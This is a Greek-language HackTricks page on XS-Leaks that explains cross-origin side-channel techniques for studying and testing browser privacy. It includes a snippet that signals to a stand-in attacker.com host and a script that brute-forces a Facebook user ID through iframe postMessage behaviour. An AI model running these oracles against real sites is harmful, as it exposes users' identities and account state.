# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

XS-Search είναι μια μέθοδος που χρησιμοποιείται για την εξαγωγή cross-origin πληροφοριών αξιοποιώντας ευπάθειες side-channel.

Βασικά συστατικά που εμπλέκονται σε αυτή την επίθεση περιλαμβάνουν:

- **Vulnerable Web**: Ο ιστότοπος-στόχος από τον οποίο σκοπεύει να εξαχθεί η πληροφορία.
- **Attacker's Web**: Ο κακόβουλος ιστότοπος που δημιουργείται από τον επιτιθέμενο, τον οποίο επισκέπτεται το θύμα, και που φιλοξενεί το exploit.
- **Inclusion Method**: Η τεχνική που χρησιμοποιείται για να ενσωματωθεί το Vulnerable Web στο Attacker's Web (π.χ., window.open, iframe, fetch, HTML tag με href, κ.λπ.).
- **Leak Technique**: Τεχνικές που χρησιμοποιούνται για να διακριθούν οι διαφορές στην κατάσταση του Vulnerable Web βάσει των πληροφοριών που συλλέγονται μέσω της inclusion method.
- **States**: Οι δύο πιθανές συνθήκες του Vulnerable Web που ο επιτιθέμενος στοχεύει να διαχωρίσει.
- **Detectable Differences**: Παρατηρήσιμες διαφορές στις οποίες βασίζεται ο επιτιθέμενος για να συναγάγει την κατάσταση του Vulnerable Web.

### Ανιχνεύσιμες Διαφορές

Διάφορες πτυχές μπορούν να αναλυθούν για να διακριθούν οι καταστάσεις του Vulnerable Web:

- **Status Code**: Διαχωρισμός μεταξύ **various HTTP response status codes** cross-origin, όπως σφάλματα διακομιστή, σφάλματα πελάτη ή σφάλματα πιστοποίησης.
- **API Usage**: Αναγνώριση **usage of Web APIs** σε σελίδες, αποκαλύπτοντας αν μια cross-origin σελίδα χρησιμοποιεί ένα συγκεκριμένο JavaScript Web API.
- **Redirects**: Ανίχνευση πλοηγήσεων προς διαφορετικές σελίδες, όχι μόνο HTTP redirects αλλά και αυτών που προκαλούνται από JavaScript ή HTML.
- **Page Content**: Παρατήρηση **διαφορών στο HTTP response body** ή σε υπο-πόρους της σελίδας, όπως ο **αριθμός ενσωματωμένων frames** ή διαφορές στο μέγεθος εικόνων.
- **HTTP Header**: Σημείωση της παρουσίας ή ενδεχομένως της τιμής ενός **συγκεκριμένου HTTP response header**, συμπεριλαμβανομένων headers όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
- **Timing**: Παρατήρηση συνεπών χρονικών αποκλίσεων μεταξύ των δύο καταστάσεων.

### Inclusion Methods

- **HTML Elements**: Το HTML προσφέρει διάφορα στοιχεία για **cross-origin resource inclusion**, όπως stylesheets, images, ή scripts, αναγκάζοντας τον browser να ζητήσει έναν μη-HTML πόρο. Μια συλλογή πιθανών HTML elements για αυτόν τον σκοπό βρίσκεται στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Frames**: Στοιχεία όπως **iframe**, **object**, και **embed** μπορούν να ενσωματώσουν HTML resources απευθείας στη σελίδα του επιτιθέμενου. Αν η σελίδα **lack framing protection**, το JavaScript μπορεί να έχει πρόσβαση στο window αντικείμενο του frame μέσω της ιδιότητας contentWindow.
- **Pop-ups**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε νέα καρτέλα ή παράθυρο, παρέχοντας ένα **window handle** για το JavaScript ώστε να αλληλεπιδρά με μεθόδους και ιδιότητες σύμφωνα με το SOP. Τα pop-ups, που χρησιμοποιούνται συχνά σε single sign-on, παρακάμπτουν framing και cookie περιορισμούς ενός στόχου πόρου. Ωστόσο, οι σύγχρονοι browsers περιορίζουν τη δημιουργία pop-up σε ορισμένες ενέργειες χρήστη.
- **JavaScript Requests**: Το JavaScript επιτρέπει άμεσες αιτήσεις σε στοχευμένους πόρους χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο πάνω στο request, όπως την επιλογή να ακολουθήσουν HTTP redirects.

### Leak Techniques

- **Event Handler**: Μια κλασική τεχνική leak στο XS-Leaks, όπου handlers γεγονότων όπως **onload** και **onerror** παρέχουν πληροφορίες για την επιτυχία ή αποτυχία της φόρτωσης ενός πόρου.
- **Error Messages**: JavaScript exceptions ή ειδικές error pages μπορούν να παρέχουν πληροφορία είτε απευθείας από το μήνυμα σφάλματος είτε διακρίνοντας την παρουσία ή απουσία του.
- **Global Limits**: Φυσικοί περιορισμοί ενός browser, όπως η χωρητικότητα μνήμης ή άλλα επιβαλλόμενα όρια, μπορούν να σηματοδοτήσουν πότε επιτυγχάνεται ένα όριο και να χρησιμοποιηθούν ως leak technique.
- **Global State**: Ανιχνεύσιμες αλληλεπιδράσεις με **global states** των browsers (π.χ. το History interface) μπορούν να εκμεταλλευτούν. Για παράδειγμα, ο **αριθμός εγγραφών** στο history ενός browser μπορεί να δώσει ενδείξεις για cross-origin σελίδες.
- **Performance API**: Αυτό το API παρέχει **λεπτομέρειες απόδοσης της τρέχουσας σελίδας**, συμπεριλαμβανομένου του network timing για το document και τους φορτωμένους πόρους, επιτρέποντας συναγωγές για τους ζητημένους πόρους.
- **Readable Attributes**: Ορισμένα HTML attributes είναι **readable cross-origin** και μπορούν να χρησιμοποιηθούν ως leak technique. Για παράδειγμα, η ιδιότητα `window.frame.length` επιτρέπει στο JavaScript να μετρά τα frames που έχουν ενσωματωθεί σε μια σελίδα cross-origin.

## XSinator Tool & Paper

XSinator είναι ένα αυτόματο εργαλείο για να ελέγξει browsers έναντι πολλών γνωστών XS-Leaks που εξηγούνται στο paper: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Μπορείτε να **έχετε πρόσβαση στο εργαλείο στο** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Excluded XS-Leaks**: Αναγκαστήκαμε να εξαιρέσουμε XS-Leaks που βασίζονται σε **service workers** καθώς αυτά θα επηρέαζαν άλλα leaks στο XSinator. Επιπλέον, επιλέξαμε να **εξαιρέσουμε XS-Leaks που βασίζονται σε misconfiguration και bugs σε συγκεκριμένες web εφαρμογές**. Για παράδειγμα, CrossOrigin Resource Sharing (CORS) misconfigurations, postMessage leakage ή Cross-Site Scripting. Επιπλέον, αποκλείσαμε timebased XS-Leaks επειδή συχνά είναι αργά, θορυβώδη και ανακριβή.

## **Timing Based techniques**

Μερικές από τις παρακάτω τεχνικές θα χρησιμοποιήσουν τον χρόνο ως μέρος της διαδικασίας για να ανιχνεύσουν διαφορές στις πιθανές καταστάσεις των σελίδων. Υπάρχουν διαφορετικοί τρόποι μέτρησης του χρόνου σε έναν web browser.

**Clocks**: Το API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) επιτρέπει στους developers να λάβουν χρονικές μετρήσεις υψηλής ανάλυσης.\
Υπάρχει ένας σημαντικός αριθμός APIs που οι επιτιθέμενοι μπορούν να καταχραστούν για να δημιουργήσουν implicit clocks: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event Handler Techniques

### Onload/Onerror

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Summary**: Αν επιχειρείτε να φορτώσετε έναν πόρο, τα events onload/onerror ενεργοποιούνται όταν ο πόρος φορτωθεί επιτυχώς/αποτυγχάνει — με αυτόν τον τρόπο είναι δυνατό να προσδιοριστεί ο status code.
- **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)


{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Το παράδειγμα κώδικα προσπαθεί να φορτώσει scripts objects από JS, αλλά **other tags** όπως objects, stylesheets, images, audios μπορούν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να εισάγετε το **tag απευθείας** και να δηλώσετε τα `onload` και `onerror` events μέσα στο tag (αντί να τα εισάγετε από JS).
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Σε αυτή την περίπτωση, αν το `example.com/404` δεν βρεθεί, το `attacker.com/?error` θα φορτωθεί.

### Content-Type/CORB script load oracle

- **Μέθοδοι συμπερίληψης**: HTML Elements (script)
- **Ανιχνεύσιμη Διαφορά**: Header / Content-Type via onload vs onerror (CORB)
- **Περίληψη:** Αν ένα endpoint επιστρέφει HTML σε περίπτωση ταύτισης και JSON σε περίπτωση μη-ταύτισης, φορτώστε το με `<script src>`. Το HTML ενεργοποιεί `onload`· το JSON μπλοκάρεται από CORB και πυροδοτεί `onerror`, παρέχοντας ένα Boolean oracle για brute-force identifiers όπως `__user` εντός γνωστού scope.
- **Σημειώσεις:** Λειτουργεί cross-origin χωρίς ανάγνωση των bodies· χρήσιμο για να εντοπιστεί/απαριθμηθεί το active account όταν ένα tenant ID είναι σταθερό.

### postMessage vs X-Frame-Options deny oracle

- **Μέθοδοι συμπερίληψης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Header (XFO) + postMessage παρουσία/απουσία
- **Περίληψη:** Κάποια widgets κάνουν postMessage στον parent μόλις φορτωθούν. Αν το request γίνει σε iframe με λάθος identifier, ο server μπορεί να απαντήσει με `X-Frame-Options: deny`, αποτρέποντας το rendering και επομένως δεν εκπέμπεται μήνυμα. Ορίζοντας το iframe `src` με το candidate ID, περιμένοντας το `message` event (επιτυχία) και αντιμετωπίζοντας timeout/έλλειψη μηνύματος ως αποτυχία, το active account μπορεί να γίνει brute-forced.
- **Ελάχιστο απόσπασμα:**
```html
<iframe id=fb width=0 height=0></iframe>
<script>
function test(id){
fb.src=`https://www.facebook.com/plugins/like.php?__a=1&__user=${id}`;
return new Promise(r=>{
const t=setTimeout(()=>r(false),2000);
onmessage=()=>{clearTimeout(t);r(true);}
});
}
</script>
```
- **Related:**
{{#ref}}
../postmessage-vulnerabilities/README.md
{{#endref}}

{{#ref}}
../iframe-traps.md
{{#endref}}

για περισσότερες παγίδες σχετικά με μηνύματα και iframe.

### Onload Timing

- **Μέθοδοι ενσωμάτωσης**: HTML Elements
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Σύνοψη:** Η [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για την εκτέλεση ενός request. Ωστόσο, μπορούν να χρησιμοποιηθούν και άλλα ρολόγια, όπως η [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) που μπορεί να εντοπίσει εργασίες που διαρκούν περισσότερα από 50ms.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) άλλο παράδειγμα στο:


{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

Αυτή η τεχνική είναι παρόμοια με την προηγούμενη, αλλά ο **attacker** θα επίσης **αναγκάσει** κάποια ενέργεια να πάρει μια **σημαντική ποσότητα χρόνου** όταν η **απάντηση είναι θετική ή αρνητική** και θα μετρήσει αυτόν τον χρόνο.


{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Μέθοδοι ενσωμάτωσης**: Frames
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Σύνοψη:** Το [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για την εκτέλεση ενός request. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Ο χρόνος που απαιτείται για την ανάκτηση ενός resource μπορεί να μετρηθεί χρησιμοποιώντας τα γεγονότα [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) και [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Το **`beforeunload`** γεγονός πυροδοτείται όταν ο browser πρόκειται να μεταβεί σε μια νέα σελίδα, ενώ το **`unload`** γεγονός συμβαίνει όταν η πλοήγηση πραγματοποιείται στην πραγματικότητα. Η διαφορά χρόνου μεταξύ αυτών των δύο γεγονότων μπορεί να υπολογιστεί για να καθοριστεί η **διάρκεια που ο browser πέρασε στην ανάκτηση του resource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Μέθοδοι ενσωμάτωσης**: Frames
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Σύνοψη:** Η [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για την εκτέλεση ενός request. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
- **Παράδειγμα κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Έχει παρατηρηθεί ότι όταν απουσιάζουν τα [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), ο χρόνος που απαιτείται για να φορτώσει μια σελίδα και τα υποresources της μέσω του δικτύου μπορεί να μετρηθεί από έναν attacker. Αυτή η μέτρηση είναι συνήθως δυνατή επειδή ο χειριστής `onload` ενός iframe ενεργοποιείται μόνο μετά την ολοκλήρωση του φόρτου των πόρων και της εκτέλεσης του JavaScript. Για να παρακαμφθεί η μεταβλητότητα που εισάγεται από την εκτέλεση σεναρίων, ένας attacker μπορεί να χρησιμοποιήσει το χαρακτηριστικό [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) μέσα στο `<iframe>`. Η προσθήκη αυτού του χαρακτηριστικού περιορίζει πολλές λειτουργικότητες, κυρίως την εκτέλεση JavaScript, διευκολύνοντας έτσι μια μέτρηση που επηρεάζεται κυρίως από την απόδοση του δικτύου.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Page Content
- **Περισσότερες πληροφορίες**:
- **Περίληψη**: Αν μπορείτε να κάνετε τη σελίδα να επιστρέφει σφάλμα όταν προσεγγίζεται το σωστό περιεχόμενο και να φορτώνει σωστά όταν προσεγγίζεται οποιοδήποτε περιεχόμενο, τότε μπορείτε να φτιάξετε ένα βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
- **Παράδειγμα Κώδικα**:

Υποθέστε ότι μπορείτε να **εισάγετε** τη **σελίδα** που έχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε να **κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**flag**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**onload event**_ θα **εκτελεστεί πάντα τουλάχιστον μία φορά**. Έπειτα, μπορείτε να **αλλάξετε** το **URL** του **iframe** αλλά αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στο URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Αν το πρώτο URL φορτώθηκε **επιτυχώς**, τότε, όταν **αλλάζετε** το μέρος **hash** του URL το **onload** event **δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη φόρτωση, τότε, το **onload** event θα **ενεργοποιηθεί ξανά**.

Έτσι, μπορείτε να **διακρίνετε** μεταξύ μιας σελίδας που φορτώθηκε **σωστά** ή μιας σελίδας που έχει **σφάλμα** όταν προσεγγίζεται.

### Javascript Execution

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Page Content
- **Περισσότερες πληροφορίες**:
- **Περίληψη:** Αν η **σελίδα** επιστρέφει το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να **ελεγχθεί** από τον χρήστη. Ο χρήστης θα μπορούσε να θέσει **έγκυρο JS κώδικα στην αρνητική περίπτωση**, να φορτώνει κάθε προσπάθεια μέσα σε **`<script>`** tags, έτσι στις **αρνητικές** περιπτώσεις ο κώδικας του επιτιθέμενου **εκτελείται,** και στις **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελείται.
- **Παράδειγμα Κώδικα:**


{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Μέθοδοι Ενσωμάτωσης**: HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Status Code & Headers
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Περίληψη**: Το **Cross-Origin Read Blocking (CORB)** είναι ένα μέτρο ασφάλειας που εμποδίζει τις ιστοσελίδες να φορτώνουν ορισμένους ευαίσθητους cross-origin πόρους για προστασία από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν τη συμπεριφορά του. Όταν μια απάντηση που υπόκειται σε **CORB** επιστρέφει έναν _**CORB protected**_ `Content-Type` με `nosniff` και κωδικό κατάστασης `2xx`, **το CORB αφαιρεί** το σώμα και τους headers της απάντησης. Οι επιτιθέμενοι που παρατηρούν αυτό μπορούν να συμπεράνουν τον συνδυασμό του **status code** (που δείχνει επιτυχία ή σφάλμα) και του `Content-Type` (που υποδεικνύει αν προστατεύεται από **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
- **Παράδειγμα Κώδικα:**

Δείτε τον σύνδεσμο "περισσότερες πληροφορίες" για περισσότερες λεπτομέρειες σχετικά με την επίθεση.

### onblur

- **Μέθοδοι Ενσωμάτωσης**: Frames
- **Ανιχνεύσιμη Διαφορά**: Page Content
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Περίληψη**: Διαρροή ευαίσθητων δεδομένων από το id ή το name attribute.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατό να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα **να εστιάσει στο στοιχείο** του iframe με το συγκεκριμένο id, και αν ένα **`onblur`** σήμα ενεργοποιηθεί, το στοιχείο με το ID υπάρχει.\
Μπορείτε να εκτελέσετε την ίδια επίθεση με **`portal`** tags.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: API Usage
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Περίληψη**: Συλλογή ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας postMessages ως oracle για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
- **Παράδειγμα Κώδικα**: `Any code listening for all postMessages.`

Εφαρμογές συχνά χρησιμοποιούν [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για επικοινωνία μεταξύ διαφορετικών origins. Ωστόσο, αυτή η μέθοδος μπορεί κατά λάθος να αποκαλύψει **ευαίσθητες πληροφορίες** αν η παράμετρος `targetOrigin` δεν ορίζεται σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λάβει τα μηνύματα. Επιπλέον, η ίδια η λήψη ενός μηνύματος μπορεί να λειτουργήσει ως **oracle**· για παράδειγμα, ορισμένα μηνύματα μπορεί να αποστέλλονται μόνο σε χρήστες που είναι συνδεδεμένοι. Συνεπώς, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες για την κατάσταση ή την ταυτότητα του χρήστη, όπως αν είναι authenticated ή όχι.

## Global Limits Techniques

### WebSocket API

- **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: API Usage
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Περίληψη**: Εξαντλώντας το όριο συνδέσεων WebSocket αποκαλύπτεται ο αριθμός των WebSocket συνδέσεων μιας cross-origin σελίδας.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Είναι δυνατόν να προσδιορίσετε αν, και πόσες, **WebSocket συνδέσεις χρησιμοποιεί μια στοχευόμενη σελίδα**. Αυτό επιτρέπει σε έναν επιτιθέμενο να εντοπίσει καταστάσεις εφαρμογών και να διαρρεύσει πληροφορίες συνδεδεμένες με τον αριθμό των WebSocket συνδέσεων.

Αν ένα **origin** χρησιμοποιεί το **μέγιστο πλήθος αντικειμένων WebSocket**, ανεξαρτήτως της κατάστασης σύνδεσης, η δημιουργία **νέων αντικειμένων θα έχει ως αποτέλεσμα JavaScript exceptions**. Για να εκτελεστεί αυτή η επίθεση, ο ιστότοπος του επιτιθέμενου ανοίγει την στοχευόμενη ιστοσελίδα σε ένα pop-up ή iframe και τότε, αφού φορτωθεί ο στόχος, προσπαθεί να δημιουργήσει τον μέγιστο αριθμό δυνατών WebSocket συνδέσεων. Ο **αριθμός των exceptions που ρίχνονται** είναι ο **αριθμός των WebSocket συνδέσεων που χρησιμοποιεί το παράθυρο της στοχευόμενης ιστοσελίδας**.

### Payment API

- **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: API Usage
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Περίληψη**: Ανίχνευση Payment Request επειδή μόνο ένα μπορεί να είναι ενεργό ταυτόχρονα.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτό το XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει πότε μια cross-origin σελίδα ξεκινά ένα payment request**.

Επειδή **μόνο ένα payment request μπορεί να είναι ενεργό** κάθε φορά, αν η στοχευόμενη ιστοσελίδα χρησιμοποιεί το Payment Request API, οποιεσδήποτε **επιπλέον προσπάθειες να εμφανίσουν αυτή την API UI θα αποτύχουν**, και θα προκαλέσουν **JavaScript exception**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας περιοδικά να εμφανίσει το Payment API UI. Αν μια προσπάθεια προκαλέσει exception, η στοχευόμενη ιστοσελίδα τη δεδομένη στιγμή το χρησιμοποιεί. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Μέθοδοι Ενσωμάτωσης**:
- **Ανιχνεύσιμη Διαφορά**: Timing (γενικά λόγω Page Content, Status Code)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Περίληψη:** Μέτρηση του χρόνου εκτέλεσης ενός web κώδικα εκμεταλλευόμενοι το single-threaded JS event loop.
- **Παράδειγμα Κώδικα**:


{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

Η JavaScript λειτουργεί σε ένα [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) μοντέλο concurrency, που σημαίνει ότι **μπορεί να εκτελεί μόνο μία εργασία τη φορά**. Αυτό το χαρακτηριστικό μπορεί να εκμεταλλευτεί για να μετρηθεί **πόσο χρόνο χρειάζεται ο κώδικας από διαφορετικό origin να εκτελεστεί**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στο event loop στέλνοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η ουρά γεγονότων είναι κενή. Αν και άλλα origins στέλνουν γεγονότα στην ίδια ουρά, ένας **επιτιθέμενος μπορεί να συμπεράνει τον χρόνο που χρειάζονται αυτά τα εξωτερικά γεγονότα για να εκτελεστούν παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του event loop για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης κώδικα από διαφορετικά origins, εκθέτοντας ενδεχομένως ευαίσθητες πληροφορίες.

> [!WARNING]
> Σε μια εκτέλεση timing είναι δυνατό να **εξαλείψετε** **δικτυακούς παράγοντες** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας πόρους που χρησιμοποιεί η σελίδα πριν την φορτώσετε.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Μέθοδοι Ενσωμάτωσης**:
- **Ανιχνεύσιμη Διαφορά**: Timing (γενικά λόγω Page Content, Status Code)
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Περίληψη:** Μια μέθοδος για να μετρήσετε τον χρόνο εκτέλεσης μιας web ενέργειας περιλαμβάνει το σκόπιμο μπλοκάρισμα του event loop ενός νήματος και στη συνέχεια τη μέτρηση **πόσος χρόνος χρειάζεται μέχρι το event loop να ξαναγίνει διαθέσιμο**. Εισάγοντας μια blocking λειτουργία (όπως έναν μεγάλο υπολογισμό ή μια συγχρονική κλήση API) στο event loop, και παρακολουθώντας τον χρόνο μέχρι να αρχίσει η εκτέλεση του επόμενου κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στο event loop κατά την περίοδο μπλοκαρίσματος. Αυτή η τεχνική αξιοποιεί τη single-threaded φύση του JavaScript event loop, όπου οι εργασίες εκτελούνται σειριακά, και μπορεί να παρέχει πληροφορίες για την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.
- **Παράδειγμα Κώδικα**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης κλειδώνοντας το event loop είναι η δυνατότητα παράκαμψης του **Site Isolation**. Το **Site Isolation** είναι μια λειτουργία ασφάλειας που χωρίζει διάφορες ιστοσελίδες σε ξεχωριστές διεργασίες, με στόχο να αποτρέψει κακόβουλα sites από το να έχουν άμεση πρόσβαση σε ευαίσθητα δεδομένα άλλων sites. Ωστόσο, επηρεάζοντας την εκτέλεση χρόνου ενός άλλου origin μέσω του κοινόχρηστου event loop, ένας επιτιθέμενος μπορεί έμμεσα να εξάγει πληροφορίες για τις δραστηριότητες εκείνου του origin. Αυτή η μέθοδος δεν βασίζεται στην άμεση πρόσβαση στα δεδομένα του άλλου origin αλλά παρατηρεί τον αντίκτυπο των δραστηριοτήτων του στο κοινό event loop, παρακάμπτοντας έτσι τα προστατευτικά εμπόδια που καθιερώνει το **Site Isolation**.

> [!WARNING]
> Σε μια εκτέλεση timing είναι δυνατό να **εξαλείψετε** **δικτυακούς παράγοντες** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας πόρους που χρησιμοποιεί η σελίδα πριν την φορτώσετε.

### Connection Pool

- **Μέθοδοι Ενσωμάτωσης**: JavaScript Requests
- **Ανιχνεύσιμη Διαφορά**: Timing (γενικά λόγω Page Content, Status Code)
